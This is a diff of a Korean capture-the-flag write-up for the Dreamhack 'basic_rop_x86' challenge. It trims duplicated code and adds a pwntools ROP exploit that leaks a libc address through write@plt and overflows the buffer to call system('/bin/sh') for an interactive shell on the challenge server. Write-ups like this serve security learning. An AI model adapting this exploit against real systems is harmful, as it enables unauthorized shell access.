@@ -170,42 +170,6 @@ main = e.symbols["main"]
 
 #### 5) read 함수와 system 함수의 symbols 옵셋 구하기 / sh 주소 구하기
 ``` python 
-from pwn import *
-
-TEST = True
-if TEST:
-    p = process("./basic_rop_x86")
-    e = ELF("./basic_rop_x86")
-    libc = e.libc
-else:
-    p = remote('host3.dreamhack.games', 13458)
-    e = ELF("./basic_rop_x86")
-    libc = ELF("./libc.so.6")
-
-# ROP(e)는 ELF에서 ROP 가젯을 자도응로 수집해서 활용할 수 있게 해 줌.
-r = ROP(e)
-
-'''
-read_plt = e.plt["read"]
-: read() 함수의 PLT(Procedure Linkage Table) 엔트리 주소.
-: 프로그램이 read()를 호출할 때 실제로 점프하는 위치.
-: 즉, ROP 체인에서 call read 같은 효과를 주고 싶을 때 사용.
-
-read_got = e.got["read"]
-: read() 함수의 GOT(Global Offset Table) 엔트리 주소.
-: 실행 시작 시 read()의 실제 libc 주소가 없으므로, 처음 호출될 때 resolve 되어 GOT에 기록됨.
-: puts(read_got) 같은 식으로 출력하면 libc의 실제 read() 주소를 leak할 수 있음.
-
-main = e.symbols["main"]
-: main() 함수의 주소.
-:보통 첫 번째 ROP 공격(주소 leak) 후 프로그램을 정상 흐름으로 되돌리기 위해 main으로 점프시킴.
-: 즉, "프로그램을 초기 상태로 리셋"하는 역할.
-'''
-read_plt = e.plt["read"]
-read_got = e.got["read"]
-write_plt = e.plt["write"]
-write_got = e.got["write"]
-main = e.symbols["main"]
 
 '''
 read_offset = libc.symbols["read"]
@@ -236,66 +200,6 @@ sh_offset = list(libc.search(b"/bin/sh"))[0]
 #### 6) 리턴 가젯 찾기
 
 ``` python
-from pwn import *
-
-TEST = True
-if TEST:
-    p = process("./basic_rop_x86")
-    e = ELF("./basic_rop_x86")
-    libc = e.libc
-else:
-    p = remote('host3.dreamhack.games', 13458)
-    e = ELF("./basic_rop_x86")
-    libc = ELF("./libc.so.6")
-
-# ROP(e)는 ELF에서 ROP 가젯을 자도응로 수집해서 활용할 수 있게 해 줌.
-r = ROP(e)
-
-'''
-read_plt = e.plt["read"]
-: read() 함수의 PLT(Procedure Linkage Table) 엔트리 주소.
-: 프로그램이 read()를 호출할 때 실제로 점프하는 위치.
-: 즉, ROP 체인에서 call read 같은 효과를 주고 싶을 때 사용.
-
-read_got = e.got["read"]
-: read() 함수의 GOT(Global Offset Table) 엔트리 주소.
-: 실행 시작 시 read()의 실제 libc 주소가 없으므로, 처음 호출될 때 resolve 되어 GOT에 기록됨.
-: puts(read_got) 같은 식으로 출력하면 libc의 실제 read() 주소를 leak할 수 있음.
-
-main = e.symbols["main"]
-: main() 함수의 주소.
-:보통 첫 번째 ROP 공격(주소 leak) 후 프로그램을 정상 흐름으로 되돌리기 위해 main으로 점프시킴.
-: 즉, "프로그램을 초기 상태로 리셋"하는 역할.
-'''
-read_plt = e.plt["read"]
-read_got = e.got["read"]
-write_plt = e.plt["write"]
-write_got = e.got["write"]
-main = e.symbols["main"]
-
-'''
-read_offset = libc.symbols["read"]
-: libc.so.6 안에 정의된 read() 함수의 오프셋(상대 주소).
-: libc는 메모리에 로드될 때 base 주소가 랜덤이지만, base + offset = 실제 주소 가 성립함.
-: 따라서 leak한 read 주소에서 base를 구할 수 있음:
-: libc_base = leaked_read - read_offset
-
-system_offset = libc.symbols["system"]
-: libc 안의 system() 함수 오프셋. 
-: system("/bin/sh") 실행을 위해 필요
-: 나중에:
-: system_addr = libc_base + system_offset
-
-sh_offset = list(libc.search(b"/bin/sh"))[0]
-: libc 메모리 안에서 "/bin/sh" 문자열을 찾음.
-: libc.search(b"/bin/sh") → 제너레이터 반환 (주소 후보들).
-: list(...)[0] → 첫 번째 /bin/sh 문자열의 오프셋.
-: 최종 실제 주소는:
-: binsh_addr = libc_base + sh_offset
-'''
-read_offset = libc.symbols["read"]
-system_offset = libc.symbols["system"]
-sh_offset = list(libc.search(b"/bin/sh"))[0]
 
 pop_ret = r.find_gadget(['pop ebp', 'ret'])[0]
 pop2_ret = r.find_gadget(['pop edi', 'pop ebp', 'ret'])[0]
@@ -306,70 +210,6 @@ pop3_ret = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]
 #### 7) read_got 주소를 얻기 위한 페이로드 작성.
 
 ``` python
-from pwn import *
-
-TEST = True
-if TEST:
-    p = process("./basic_rop_x86")
-    e = ELF("./basic_rop_x86")
-    libc = e.libc
-else:
-    p = remote('host3.dreamhack.games', 13458)
-    e = ELF("./basic_rop_x86")
-    libc = ELF("./libc.so.6")
-
-# ROP(e)는 ELF에서 ROP 가젯을 자도응로 수집해서 활용할 수 있게 해 줌.
-r = ROP(e)
-
-'''
-read_plt = e.plt["read"]
-: read() 함수의 PLT(Procedure Linkage Table) 엔트리 주소.
-: 프로그램이 read()를 호출할 때 실제로 점프하는 위치.
-: 즉, ROP 체인에서 call read 같은 효과를 주고 싶을 때 사용.
-
-read_got = e.got["read"]
-: read() 함수의 GOT(Global Offset Table) 엔트리 주소.
-: 실행 시작 시 read()의 실제 libc 주소가 없으므로, 처음 호출될 때 resolve 되어 GOT에 기록됨.
-: puts(read_got) 같은 식으로 출력하면 libc의 실제 read() 주소를 leak할 수 있음.
-
-main = e.symbols["main"]
-: main() 함수의 주소.
-:보통 첫 번째 ROP 공격(주소 leak) 후 프로그램을 정상 흐름으로 되돌리기 위해 main으로 점프시킴.
-: 즉, "프로그램을 초기 상태로 리셋"하는 역할.
-'''
-read_plt = e.plt["read"]
-read_got = e.got["read"]
-write_plt = e.plt["write"]
-write_got = e.got["write"]
-main = e.symbols["main"]
-
-'''
-read_offset = libc.symbols["read"]
-: libc.so.6 안에 정의된 read() 함수의 오프셋(상대 주소).
-: libc는 메모리에 로드될 때 base 주소가 랜덤이지만, base + offset = 실제 주소 가 성립함.
-: 따라서 leak한 read 주소에서 base를 구할 수 있음:
-: libc_base = leaked_read - read_offset
-
-system_offset = libc.symbols["system"]
-: libc 안의 system() 함수 오프셋. 
-: system("/bin/sh") 실행을 위해 필요
-: 나중에:
-: system_addr = libc_base + system_offset
-
-sh_offset = list(libc.search(b"/bin/sh"))[0]
-: libc 메모리 안에서 "/bin/sh" 문자열을 찾음.
-: libc.search(b"/bin/sh") → 제너레이터 반환 (주소 후보들).
-: list(...)[0] → 첫 번째 /bin/sh 문자열의 오프셋.
-: 최종 실제 주소는:
-: binsh_addr = libc_base + sh_offset
-'''
-read_offset = libc.symbols["read"]
-system_offset = libc.symbols["system"]
-sh_offset = list(libc.search(b"/bin/sh"))[0]
-
-pop_ret = r.find_gadget(['pop ebp', 'ret'])[0]
-pop2_ret = r.find_gadget(['pop edi', 'pop ebp', 'ret'])[0]
-pop3_ret = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]
 
 # Stage 1
 '''
@@ -396,89 +236,6 @@ payload += p32(main)
 #### 8) 구해진 read@got를 이용하여 system, sh 주소 구하기
 
 ``` python
-from pwn import *
-
-TEST = True
-if TEST:
-    p = process("./basic_rop_x86")
-    e = ELF("./basic_rop_x86")
-    libc = e.libc
-else:
-    p = remote('host3.dreamhack.games', 13458)
-    e = ELF("./basic_rop_x86")
-    libc = ELF("./libc.so.6")
-
-# ROP(e)는 ELF에서 ROP 가젯을 자도응로 수집해서 활용할 수 있게 해 줌.
-r = ROP(e)
-
-'''
-read_plt = e.plt["read"]
-: read() 함수의 PLT(Procedure Linkage Table) 엔트리 주소.
-: 프로그램이 read()를 호출할 때 실제로 점프하는 위치.
-: 즉, ROP 체인에서 call read 같은 효과를 주고 싶을 때 사용.
-
-read_got = e.got["read"]
-: read() 함수의 GOT(Global Offset Table) 엔트리 주소.
-: 실행 시작 시 read()의 실제 libc 주소가 없으므로, 처음 호출될 때 resolve 되어 GOT에 기록됨.
-: puts(read_got) 같은 식으로 출력하면 libc의 실제 read() 주소를 leak할 수 있음.
-
-main = e.symbols["main"]
-: main() 함수의 주소.
-:보통 첫 번째 ROP 공격(주소 leak) 후 프로그램을 정상 흐름으로 되돌리기 위해 main으로 점프시킴.
-: 즉, "프로그램을 초기 상태로 리셋"하는 역할.
-'''
-read_plt = e.plt["read"]
-read_got = e.got["read"]
-write_plt = e.plt["write"]
-write_got = e.got["write"]
-main = e.symbols["main"]
-
-'''
-read_offset = libc.symbols["read"]
-: libc.so.6 안에 정의된 read() 함수의 오프셋(상대 주소).
-: libc는 메모리에 로드될 때 base 주소가 랜덤이지만, base + offset = 실제 주소 가 성립함.
-: 따라서 leak한 read 주소에서 base를 구할 수 있음:
-: libc_base = leaked_read - read_offset
-
-system_offset = libc.symbols["system"]
-: libc 안의 system() 함수 오프셋. 
-: system("/bin/sh") 실행을 위해 필요
-: 나중에:
-: system_addr = libc_base + system_offset
-
-sh_offset = list(libc.search(b"/bin/sh"))[0]
-: libc 메모리 안에서 "/bin/sh" 문자열을 찾음.
-: libc.search(b"/bin/sh") → 제너레이터 반환 (주소 후보들).
-: list(...)[0] → 첫 번째 /bin/sh 문자열의 오프셋.
-: 최종 실제 주소는:
-: binsh_addr = libc_base + sh_offset
-'''
-read_offset = libc.symbols["read"]
-system_offset = libc.symbols["system"]
-sh_offset = list(libc.search(b"/bin/sh"))[0]
-
-pop_ret = r.find_gadget(['pop ebp', 'ret'])[0]
-pop2_ret = r.find_gadget(['pop edi', 'pop ebp', 'ret'])[0]
-pop3_ret = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]
-
-# Stage 1
-'''
-1. C소스에서 buf는 [ebp-0x44]의 위치에 있다. 해서 0x44 + 0x04(SFP) = 48
-2. 스택의 다음 주소인 리턴주소를 wreit@ple로 설정
-3. pop3_ret 가젯이 실행되면서 스택 값들이 레지스터/스택으로 들어감.
-   결과적으로:
-   fd = 1 (stdout)
-   buf = read_got (GOT 에 적힌 read 실제 libc 주소)
-   size = 4(4바이트만 출력)
-   즉, write(1, read_got, 4) 실행 -> read 실제 주소 leak
-4. write() 호출이 끝나면 main() 으로 복귀
-   프로그램이 초기 상태로 리셋 -> 두 번째 공격 가능
-'''
-payload = b'A' * 0x48
-payload += p32(write_plt)
-payload += p32(pop3_ret)
-payload += p32(1) + p32(read_got) + p32(4)
-payload += p32(main)
 
 '''
 c 소스의 read(0, buf, 0x400); 코드에서 send로 보내는 payload를 buf에 저장함
@@ -514,15 +271,29 @@ print(hex(system))
 #### 9) 다시 리셋된 main함수에서 버퍼 오버플로우를 이용하여 system("/bin/sh") 실행하기
 
 ``` python
+payload = b'A' * 0x48
+payload += p32(system)
+payload += p32(pop_ret)
+payload += p32(sh)
+
+p.send(payload)
+p.recvuntil(b'A' * 0x40)
+
+p.interactive()
+```
+
+
+#### 10) 최종결과물
+``` python
 from pwn import *
 
-TEST = True
+TEST = False
 if TEST:
     p = process("./basic_rop_x86")
     e = ELF("./basic_rop_x86")
     libc = e.libc
 else:
-    p = remote('host3.dreamhack.games', 13458)
+    p = remote('host8.dreamhack.games', 18134)
     e = ELF("./basic_rop_x86")
     libc = ELF("./libc.so.6")
 
